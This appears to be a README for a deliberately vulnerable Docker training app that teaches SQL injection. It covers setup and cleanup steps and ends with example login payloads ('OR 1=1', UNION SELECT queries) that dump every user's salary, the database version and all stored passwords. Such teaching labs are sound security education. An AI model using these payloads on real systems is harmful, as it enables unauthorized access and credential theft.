# SQL-injection-demo
Demonstration of how a SQL injection works

# Project Summary

This is a simple web application that is vulnerable to SQL injection attacks.

All credits for this demonstration go to [startrek_payroll](https://github.com/thomaslaurenson/startrek_payroll) repository created by [Thomas Laurenson](https://github.com/thomaslaurenson). Check out the project summary there for some more infromation on this project.

# Project instructions

Install the project requirements on your choice of operating system, including:

* Docker
* Docker Compose plugin

Run using either of the following:

* `make run`

* `docker compose up --build`

Open web browser and visit

* `localhost:8080`

Clean the docker Environment (after making changes):

* `make clean`
* or through Docker commands `rm` for created containers and `rmi` for created images. ***Images are associated to containers. You must first remove the container before removing the image***: 
    * Write `docker ps -a`: this gives you all containers that have been build - their ID is needed to clean them
    * Write `docker images -a` to see all docker images you have created - again their ID is important
    * To delete the containers use `docker rm` followed by the ID each container:
        
        e.g.: 
        
        All together:
        
        `docker rm 48c064730b81 c6d80ff5be44 62b9c56cd422`

        or one by one: 
        
        `docker rm 48c064730b81` 
        
        `docker rm c6d80ff5be44`
        
        `docker rm 62b9c56cd422`
        
    * Same procedure applies for the images, but with `docker rmi` command:

        e.g.:

        All together:

        `docker rmi 99e09be04fc1 cb3b004c0880 34245ab68ca0`

        or one by one:

        `docker rmi 99e09be04fc1`
        
        `docker rmi cb3b004c0880`
        
        `docker rmi 34245ab68ca0`



# Example Payloads

1. Normal login to get users salary
    
    * `username`: `james_kirk`
    * `password`: `kobayashi_maru`

2. Dump username and salary of all users:

    * `username`: `' OR 1=1#`
    * `password`: `anythingyouwant`
    
3. Dump MySQL version:

    * `username`: `' UNION SELECT null,@@version#`
    * `password`: `anythingyouwant`
    
4. Dump all users passwords:

    * `username`: `' UNION SELECT username,password FROM users#`
    * `password`: `anythingyouwant`